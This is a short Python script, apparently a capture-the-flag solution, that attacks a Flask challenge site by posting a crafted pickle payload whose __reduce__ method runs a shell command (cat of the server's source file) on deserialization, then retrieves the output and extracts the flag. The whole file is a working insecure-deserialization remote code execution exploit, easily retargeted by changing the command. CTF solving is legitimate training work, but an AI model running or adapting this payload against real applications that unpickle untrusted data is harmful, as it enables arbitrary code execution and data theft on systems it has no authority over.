import pickle,base64,requests,re

url = "https://a-flask-of-pickles.litctf.live/"

class easyRight():
    def __reduce__(self):
        import subprocess
        return subprocess.check_output, (["cat","flaskofpickles.py"], )

payload = pickle.dumps({"name": "", "bio": easyRight()})
payload = base64.b64encode(payload)

print("[+] Payload: " + str(payload))

#Post to endpoint /new
_id = requests.post(url + "new", data=payload)
#It'll return id
url_result = url + _id.text

#Get the result
print("[+] Query to url",url_result)
result = requests.get(url_result).text
print(result)
result = "flag{" + re.findall('flag{(.*?)}',result)[0] + "}"
print("[+] Get the result:",result)